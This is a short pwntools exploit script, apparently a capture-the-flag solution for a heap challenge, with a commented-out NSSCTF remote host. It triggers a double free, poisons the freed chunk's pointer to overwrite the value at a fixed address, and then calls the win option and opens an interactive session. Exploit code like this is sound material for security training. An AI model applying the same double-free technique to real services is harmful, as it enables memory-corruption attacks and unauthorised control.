from pwn import *

io = process("./service")

# io = remote("node5.anna.nssctf.cn", 26623)

context.log_level = "info"


def select(id: int):
    io.recvuntil(b"choice>")
    io.sendline(str(id).encode())


def add(size: int):
    """
    只有四次使用机会
    """
    select(1)
    io.recvuntil(b"size>")
    io.sendline(str(size).encode())


def free(idx: int):
    select(2)
    io.recvuntil(b"index>")
    io.sendline(str(idx).encode())


def edit(idx: int, contents):
    select(3)
    io.recvuntil(b"index>")
    io.sendline(str(idx).encode())
    io.send(contents)


def pwn():
    select(4)


def _debug():
    gdb.attach(io)


val_addr = 0x602080

add(0x40)
add(0x40)
free(0)
free(1)
free(0)
edit(0, p64(val_addr))
add(0x40)
add(0x40)
edit(3, p64(0))
pwn()


io.interactive()
